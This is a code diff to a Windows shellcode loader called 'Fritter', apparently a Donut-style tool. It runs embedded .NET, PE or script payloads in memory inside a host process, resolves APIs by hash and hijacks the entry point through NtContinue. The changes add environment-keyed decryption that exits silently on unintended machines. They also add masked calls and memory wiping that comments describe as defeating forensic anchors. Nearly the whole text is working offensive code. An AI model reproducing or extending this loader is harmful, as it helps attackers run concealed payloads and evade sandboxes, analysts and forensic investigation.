@@ -51,7 +51,7 @@ DWORD MainProcEntry(PFRITTER_INSTANCE inst);
 #ifdef _MSC_VER
 __declspec(code_seg(".text$a"))
 #endif
-HANDLE FritterLoader(PFRITTER_INSTANCE inst) {
+HANDLE FritterLoader(PFRITTER_INSTANCE inst, PVOID hook) {
     CreateThread_t     _CreateThread;
     GetThreadContext_t _GetThreadContext;
     GetCurrentThread_t _GetCurrentThread;
@@ -61,26 +61,26 @@ HANDLE FritterLoader(PFRITTER_INSTANCE inst) {
     HANDLE             h = NULL;
     CONTEXT            c;
     LPVOID             host;
-    
+    DWORD              oep;
+
+    // where the shim keeps its exit hook; travels with the instance
+    inst->hook = (ULONG_PTR)hook;
+    // MainProc unmasks the head words where they are: read this one first
+    oep = inst->oep ^ FRITTER_PLAIN_MASK(inst, 2);
+
     DPRINT("sizeof(FRITTER_INSTANCE)        : %zu\n", sizeof(FRITTER_INSTANCE));
     DPRINT("offsetof(FRITTER_INSTANCE, api) : %zu\n", offsetof(FRITTER_INSTANCE, api));
     
     // create thread and execute original entrypoint?
-    if(inst->oep != 0) {
+    if(oep != 0) {
       DPRINT("Resolving address of CreateThread");
       hash = inst->api.hash[ (offsetof(FRITTER_INSTANCE, api.CreateThread) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR)];
       _CreateThread = (CreateThread_t)xGetProcAddressByHash(inst, hash, inst->iv);
       
-      // api resolved?
-      if(_CreateThread != NULL) {
-        // create new thread
-        DPRINT("Creating new thread");
-        h = _CreateThread(NULL, 0, ADR(LPTHREAD_START_ROUTINE, MainProcEntry), (LPVOID)inst, 0, NULL);
-      } else {
-        DPRINT("FAILED");
-        return (HANDLE)-1;
-      }
-      
+      /* Resolve every API this thread needs BEFORE starting the MainProc
+         thread. Under N>1 dispatch each xGetProcAddressByHash call XOR-
+         toggles .hash_chain with no lock; resolving after CreateThread
+         lets two threads toggle the same section concurrently. */
       DPRINT("Resolving address of NtContinue");
       hash = inst->api.hash[ (offsetof(FRITTER_INSTANCE, api.NtContinue) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR)];
       _NtContinue = (NtContinue_t)xGetProcAddressByHash(inst, hash, inst->iv);
@@ -97,13 +97,22 @@ HANDLE FritterLoader(PFRITTER_INSTANCE inst) {
       DPRINT("Resolving address of GetModuleHandleA");
       hash = inst->api.hash[ (offsetof(FRITTER_INSTANCE, api.GetModuleHandleA) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR)];
       _GetModuleHandleA = (GetModuleHandleA_t)xGetProcAddressByHash(inst, hash, inst->iv);
-      if(_GetModuleHandleA == NULL) {
-        DPRINT("FAILED to resolve GetModuleHandleA");
+
+      // Fail before the thread exists: returning to the shim after
+      // CreateThread would wipe the loader underneath MainProc.
+      if(_CreateThread     == NULL || _NtContinue       == NULL ||
+         _GetThreadContext == NULL || _GetCurrentThread == NULL ||
+         _GetModuleHandleA == NULL) {
+        DPRINT("FAILED to resolve fork APIs");
         return (HANDLE)-1;
       }
       host = _GetModuleHandleA(NULL);
-      
-      if(_NtContinue != NULL && _GetThreadContext != NULL && _GetCurrentThread != NULL) {
+
+      // No dispatcher (loader-section) calls on this thread past this point.
+      DPRINT("Creating new thread");
+      h = _CreateThread(NULL, 0, ADR(LPTHREAD_START_ROUTINE, MainProcEntry), (LPVOID)inst, 0, NULL);
+
+      {
         c.ContextFlags = CONTEXT_FULL;
         _GetThreadContext(_GetCurrentThread(), &c);
         /* P3 Site B was attempted here (volatile salt-cancel into a
@@ -113,13 +122,10 @@ HANDLE FritterLoader(PFRITTER_INSTANCE inst) {
            register and folded the XOR pair into a single un-cancelled
            XOR, corrupting c.Rip and hanging the NtContinue thread.
            Removed; sites A and C cover the default execution path. */
-        #ifdef _WIN64
-          c.Rip = RVA2VA(DWORD64, host, inst->oep);
-          c.Rsp &= -16;
-        #else
-          c.Eip = RVA2VA(DWORD64, host, inst->oep);
-          c.Esp &= -4;
-        #endif
+        c.Rip = RVA2VA(DWORD64, host, oep);
+        // The entry point expects the stack as a CALL leaves it:
+        // 16-byte aligned before the return address was pushed.
+        c.Rsp = (c.Rsp & -16) - 8;
         DPRINT("Calling NtContinue");
         //__debugbreak();
         _NtContinue(&c, FALSE);
@@ -143,63 +149,71 @@ DWORD MainProcEntry(PFRITTER_INSTANCE inst) {
     return MainProc(inst);
 }
 
+// Mix the values of the keyed environment variables into the instance key.
+// Variables are found by the hash of their name; one that is missing counts
+// as empty. Read from the process environment block: no API call.
+LOADER_FN_SECTION(".key_env")
+VOID KeyEnv(PFRITTER_INSTANCE inst) {
+    PWCHAR  env, e;
+    CHAR    name[64], val[FRITTER_MAX_NAME];
+    ULONG64 h[2];
+    DWORD   slot, i, n;
+
+    for(slot = 0; slot < FRITTER_KEY_ENVS; slot++) {
+      if(!((inst->kopt >> (8 + slot)) & 1)) continue;
+      val[0] = 0;
+      // RTL_USER_PROCESS_PARAMETERS.Environment: "NAME=VALUE\0" ... "\0"
+      env = *(PWCHAR*)((PBYTE)GET_PEB()->ProcessParameters + 0x80);
+      for(e = env; e != NULL && *e != 0; e += n + 1) {
+        for(n = 0; e[n] != 0; n++);
+        // entries such as "=C:=C:\\" have no name
+        for(i = 0; i < n && i < sizeof(name) - 1 && e[i] != L'='; i++)
+          name[i] = (CHAR)((e[i] >= L'a' && e[i] <= L'z') ? e[i] - 32 : e[i]);
+        if(i == 0 || i >= n || e[i] != L'=') continue;
+        name[i] = 0;
+        if(maru(name, inst->iv) != inst->kenv[slot]) continue;
+        for(i++, h[0] = 0; i < n && h[0] < sizeof(val) - 1; i++)
+          val[h[0]++] = (CHAR)((e[i] >= L'a' && e[i] <= L'z') ? e[i] - 32 : e[i]);
+        val[h[0]] = 0;
+        break;
+      }
+      h[0] = maru(val, inst->iv ^ inst->kenv[slot]);
+      h[1] = maru(val, ~inst->iv ^ inst->kenv[slot]);
+      for(i = 0; i < FRITTER_KEY_LEN; i++) inst->key.mk[i] ^= ((PBYTE)h)[i];
+    }
+}
+
 LOADER_FN_SECTION(".main_proc")
 DWORD MainProc(PFRITTER_INSTANCE inst) {
     ULONG                i, ofs;
     ULONG64              sig;
     FRITTER_ASSEMBLY       assembly;
     PFRITTER_MODULE        mod, unpck;
-    VirtualAlloc_t       _VirtualAlloc;
-    VirtualFree_t        _VirtualFree;
     RtlExitUserProcess_t _RtlExitUserProcess;
     LPVOID               pv, ws;
-    ULONG64              hash;
+    ULONG64              hash, exit_hash;
+    BOOL                 resolved = FALSE;
     BOOL                 term;
     PCHAR                str;
     CHAR                 path[MAX_PATH];
     
     DPRINT("Maru IV : %" PRIX64, inst->iv);
     
-    hash = inst->api.hash[ (offsetof(FRITTER_INSTANCE, api.VirtualAlloc) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR)];
-    DPRINT("Resolving address for VirtualAlloc() : %" PRIX64, hash);
-    _VirtualAlloc = (VirtualAlloc_t)xGetProcAddressByHash(inst, hash, inst->iv);
+    // The instance is decrypted where it arrived: the shellcode's memory is
+    // writable, and nothing reads the ciphertext again. Kept for the way
+    // out: the hash of RtlExitUserProcess, which resolving overwrites.
+    exit_hash = inst->api.hash[ (offsetof(FRITTER_INSTANCE, api.RtlExitUserProcess) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR)];
+
+    // the unencrypted words of the head, in the clear from here on
+    inst->exit_opt ^= FRITTER_PLAIN_MASK(inst, 0);
+    inst->entropy  ^= FRITTER_PLAIN_MASK(inst, 1);
+    inst->oep      ^= FRITTER_PLAIN_MASK(inst, 2);
+    inst->pic_off  ^= FRITTER_PLAIN_MASK(inst, 3);
+    inst->pic_len  ^= FRITTER_PLAIN_MASK(inst, 4);
+    inst->kopt     ^= (uint16_t)FRITTER_PLAIN_MASK(inst, 5);
     
-    hash = inst->api.hash[ (offsetof(FRITTER_INSTANCE, api.VirtualFree) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR)];
-    DPRINT("Resolving address for VirtualFree() : %" PRIX64, hash);
-    _VirtualFree  = (VirtualFree_t) xGetProcAddressByHash(inst, hash,  inst->iv);
-    
-    hash = inst->api.hash[ (offsetof(FRITTER_INSTANCE, api.RtlExitUserProcess) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR)];
-    DPRINT("Resolving address for RtlExitUserProcess() : %" PRIX64, hash);
-    _RtlExitUserProcess  = (RtlExitUserProcess_t) xGetProcAddressByHash(inst, hash,  inst->iv);
-    
-    // failed to resolve any?
-    if(_VirtualAlloc       == NULL || 
-       _VirtualFree        == NULL || 
-       _RtlExitUserProcess == NULL) 
-    {
-      DPRINT("FAILED!.");
-      return -1;
-    }
-    
-    DPRINT("VirtualAlloc : %p VirtualFree : %p", 
-      (LPVOID)_VirtualAlloc, (LPVOID)_VirtualFree);
-    
-    DPRINT("Allocating %i bytes of RW memory", inst->len);
-    pv = _VirtualAlloc(NULL, inst->len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    
-    if(pv == NULL) {
-      DPRINT("Memory allocation failed...");
-      // terminate host process?
-      if(inst->exit_opt == FRITTER_OPT_EXIT_PROCESS) {
-        DPRINT("Terminating host process");
-        _RtlExitUserProcess(0);
-      }
-      return -1;
-    }
-    DPRINT("Copying %i bytes of data to memory %p", inst->len, pv);
-    Memcpy(pv, inst, inst->len);
-    inst = (PFRITTER_INSTANCE)pv;
-    
+    unpck = NULL;
+
     DPRINT("Zero initializing PFRITTER_ASSEMBLY");
     Memset(&assembly, 0, sizeof(assembly));
     
@@ -209,6 +223,18 @@ DWORD MainProc(PFRITTER_INSTANCE inst) {
       // load pointer to data just past len + key
       inst_data = (PBYTE)inst + offsetof(FRITTER_INSTANCE, api_cnt);
       
+      // Key options: mix in the environment this output was keyed to, then
+      // find the bits that were left out. A wrong environment (or none of
+      // the candidates fitting) ends here, quietly, whatever -x says.
+      if(inst->kopt != 0) {
+        KeyEnv(inst);
+        if(!fritter_keyfind(inst->key.mk, inst->key.ctr, inst->kchk, inst->kopt & 0xFF)) {
+          DPRINT("No key for this environment");
+          inst->exit_opt = 0;
+          goto erase_memory;
+        }
+      }
+
       DPRINT("Decrypting %li bytes of instance", inst->len);
       
       fritter_decrypt(inst->key.mk, 
@@ -216,26 +242,25 @@ DWORD MainProc(PFRITTER_INSTANCE inst) {
               inst_data, 
               inst->len - offsetof(FRITTER_INSTANCE, api_cnt));
       
-      DPRINT("Generating hash to verify decryption");
-      ULONG64 mac = maru(inst->sig, inst->iv);
-      DPRINT("Instance : %"PRIX64" | Result : %"PRIX64, inst->mac, mac);
-      
-      if(mac != inst->mac) {
-        DPRINT("Decryption of instance failed");
-        goto erase_memory;
-      }
+    }
+    // Decrypted with the right key, and not a byte of it damaged since it
+    // was generated (encrypted or not).
+    if(inst->len < sizeof(FRITTER_INSTANCE) || FRITTER_MAC(inst) != inst->mac) {
+      DPRINT("Instance failed verification");
+      goto erase_memory;
     }
     DPRINT("Resolving LoadLibraryA");
     
     inst->api.addr[0] = xGetProcAddressByHash(inst, inst->api.hash[0], inst->iv);
-    if(inst->api.addr[0] == NULL) return -1;
+    // wipe and release the decrypted instance on the way out
+    if(inst->api.addr[0] == NULL) goto erase_memory;
     
     str = (PCHAR)inst->dll_names;
     
     // load the DLL required
     for(;;) {
       // store string until null byte or semi-colon encountered
-      for(i=0; str[i] != '\0' && str[i] !=';' && i<MAX_PATH; i++) path[i] = str[i];
+      for(i=0; str[i] != '\0' && str[i] !=';' && i<MAX_PATH-1; i++) path[i] = str[i];
       // nothing stored? exit loop
       if(i == 0) break;
       // skip name plus one for separator
@@ -256,44 +281,52 @@ DWORD MainProc(PFRITTER_INSTANCE inst) {
     uint32_t api_cnt_local = _api_cnt_v;
     DPRINT("Resolving %i API", api_cnt_local);
 
-    for(i=1; i<api_cnt_local; i++) {
-      DPRINT("Resolving API address for %016llX", inst->api.hash[i]);
-        
-      inst->api.addr[i] = xGetProcAddressByHash(inst, inst->api.hash[i], inst->iv);
-      
-      // if resolving API failed
-      if(inst->api.addr[i] == NULL) {
-        DPRINT("Failed to resolve an API");
-        // make an exception for CLRCreateInstance
-        // for older versions of dotnet
-        hash = inst->api.hash[ (offsetof(FRITTER_INSTANCE, api.CLRCreateInstance) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR)];
-        
-        if(inst->api.hash[i] == hash) {
-          DPRINT("CLRCreateInstance isn't available. Will try CorBindToRuntime.");
-          continue;
-        }
-        // else, bail out
-        goto erase_memory;
+    // one pass over the loaded modules resolves every slot
+    hash = xResolveApis(inst, api_cnt_local);
+
+    for(i=1; i<api_cnt_local && i<64; i++) {
+      if((hash >> i) & 1) continue;
+      // not used by this payload type: its DLL was not loaded either
+      if((inst->api_skip >> i) & 1) {
+        inst->api.addr[i] = NULL;
+        continue;
       }
+
+      DPRINT("Failed to resolve an API");
+      // make an exception for CLRCreateInstance
+      // for older versions of dotnet
+      if(i == (offsetof(FRITTER_INSTANCE, api.CLRCreateInstance) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR)) {
+        DPRINT("CLRCreateInstance isn't available. Will try CorBindToRuntime.");
+        inst->api.addr[i] = NULL;
+        continue;
+      }
+      // optional: absent before Windows 8 / Windows 10 1803
+      if(i == (offsetof(FRITTER_INSTANCE, api.GetProcessMitigationPolicy) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR) ||
+         i == (offsetof(FRITTER_INSTANCE, api.VirtualAlloc2) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR) ||
+         i == (offsetof(FRITTER_INSTANCE, api.MapViewOfFile3) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR)) {
+        inst->api.addr[i] = NULL;
+        continue;
+      }
+      // else, bail out
+      goto erase_memory;
     }
+    resolved = TRUE;
     
-    if(inst->type == FRITTER_INSTANCE_HTTP) {
-      DPRINT("Module is stored on remote HTTP server.");
-      if(!DownloadFromHTTP(inst)) goto erase_memory;
-      mod = inst->module.p;
-    } else
-    if(inst->type == FRITTER_INSTANCE_EMBED) {
-      DPRINT("Module is embedded.");
-      mod = (PFRITTER_MODULE)&inst->module.x;
-    }
-    
+    // The instance pages of the shellcode never execute again: drop them
+    // to read/write for the rest of the run.
+    inst->pic_base = (ULONG_PTR)inst - inst->pic_off;
+    ParkLoader(inst, PARK_DATA);
+
+    // the module is always embedded at the tail of the instance
+    mod = (PFRITTER_MODULE)&inst->module.x;
+
     // module is compressed?
     if(mod->compress == FRITTER_COMPRESS_APLIB) {
       DPRINT("Allocating %zd bytes of memory for decompressed file and module information",
         mod->len + sizeof(FRITTER_MODULE));
 
       // allocate memory for module information + size of decompressed data
-      unpck = (PFRITTER_MODULE)_VirtualAlloc(
+      unpck = (PFRITTER_MODULE)inst->api.VirtualAlloc(
         NULL, ((sizeof(FRITTER_MODULE) + mod->len) + 4095) & -4096,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
@@ -306,8 +339,20 @@ DWORD MainProc(PFRITTER_INSTANCE inst) {
       // decompress module data into new block
       DPRINT("Decompressing %"PRId32 " -> %"PRId32, mod->zlen, mod->len);
       DPRINT("Decompressing with aPLib");
-      aP_depack((PUCHAR)mod->data, (PUCHAR)unpck->data);
+      // a short, long or malformed stream means the module is damaged
+      if(mod->zlen > inst->len ||
+         aP_depack((PUCHAR)mod->data, mod->zlen,
+                      (PUCHAR)unpck->data, mod->len) != mod->len) {
+        DPRINT("Decompression failed");
+        goto erase_memory;
+      }
+      if(mod_sum(unpck->data, mod->len) != mod->sum) {
+        DPRINT("Module checksum mismatch");
+        goto erase_memory;
+      }
       DPRINT("Done");
+      // the compressed copy inside the instance is not needed again
+      Memset(mod->data, LOADER_WIPE_BYTE, mod->zlen);
       mod = unpck;
     }
     DPRINT("Checking type of module");
@@ -336,27 +381,28 @@ DWORD MainProc(PFRITTER_INSTANCE inst) {
     // if user specified to block instead of exit, then block infinitely before cleanup
     if (inst->exit_opt == FRITTER_OPT_EXIT_BLOCK) {
       DPRINT("Execution complete. Blocking indefinitely.");
-      inst->api.Sleep(INFINITE);
+      // masked, as a native payload's block is (it never gets here)
+      ((VOID (WINAPI *)(DWORD))MaskCall(inst, (PVOID)inst->api.Sleep))(INFINITE);
     }
     
 erase_memory:
-    // if module was downloaded
-    if(inst->type == FRITTER_INSTANCE_HTTP) {
-      if(inst->module.p != NULL) {
-        // overwrite memory with the per-build wipe byte (parity with the
-        // inst wipe below; defeats post-execution zero-pattern anchors)
-        Memset(inst->module.p, LOADER_WIPE_BYTE, (DWORD)inst->mod_len);
-        
-        // free memory
-        _VirtualFree(inst->module.p, 0, MEM_RELEASE | MEM_DECOMMIT);
-        inst->module.p = NULL;
-      }
+    // wipe and release the decompressed module copy
+    if(unpck != NULL) {
+      Memset(unpck, LOADER_WIPE_BYTE, (DWORD)(sizeof(FRITTER_MODULE) + unpck->len));
+      inst->api.VirtualFree(unpck, 0, MEM_RELEASE);
+      unpck = NULL;
     }
-    
+
     // should we call RtlExitUserProcess?
     term = (BOOL) (inst->exit_opt == FRITTER_OPT_EXIT_PROCESS);
+    _RtlExitUserProcess = NULL;
+    if(term) {
+      // before the instance goes: resolved already, or still a hash
+      _RtlExitUserProcess = resolved ? inst->api.RtlExitUserProcess
+        : (RtlExitUserProcess_t)xGetProcAddressByHash(inst, exit_hash, inst->iv);
+    }
     
-    DPRINT("Erasing RW memory for instance");
+    DPRINT("Erasing the instance");
     /* Per-build wipe byte (LOADER_WIPE_BYTE from gen_poly) - defeats the
        "find a zeroed page near the decoded shim" forensic anchor. The
        data is destroyed regardless of byte value.
@@ -371,10 +417,7 @@ erase_memory:
       Memset(inst, LOADER_WIPE_BYTE, _wipe_sz);
     }
     
-    DPRINT("Releasing RW memory for instance");
-    _VirtualFree(inst, 0, MEM_DECOMMIT | MEM_RELEASE);
-    
-    if(term) {
+    if(term && _RtlExitUserProcess != NULL) {
       DPRINT("Terminating host process");
       // terminate host process
       _RtlExitUserProcess(0);
@@ -391,7 +434,6 @@ int ansi2unicode(PFRITTER_INSTANCE inst, CHAR input[], WCHAR output[FRITTER_MAX_
 }
 
 #include "peb.c"             // resolve functions in export table
-#include "http_client.c"     // Download module from HTTP server
 #include "inmem_dotnet.c"    // .NET assemblies
 #include "inmem_pe.c"        // Unmanaged PE/DLL files
 #include "inmem_script.c"    // VBS/JS files
@@ -449,15 +491,16 @@ int main(int argc, char *argv[]) {
         printf("Running...");
       
         // run payload with instance
-        h = FritterLoader(inst);
-        
-        if(h != (HANDLE)-1 && inst->oep != 0) {
+        old = inst->oep ^ FRITTER_PLAIN_MASK(inst, 2);   // the instance is gone when the loader returns
+        h = FritterLoader(inst, NULL);
+
+        if(h != (HANDLE)-1 && old != 0) {
           printf("\nWaiting...");
           WaitForSingleObject(h, INFINITE);
         }
       }
       // deallocate
-      VirtualFree((LPVOID)inst, 0, MEM_DECOMMIT | MEM_RELEASE);
+      VirtualFree((LPVOID)inst, 0, MEM_RELEASE);
     }
     fclose(fd);
 
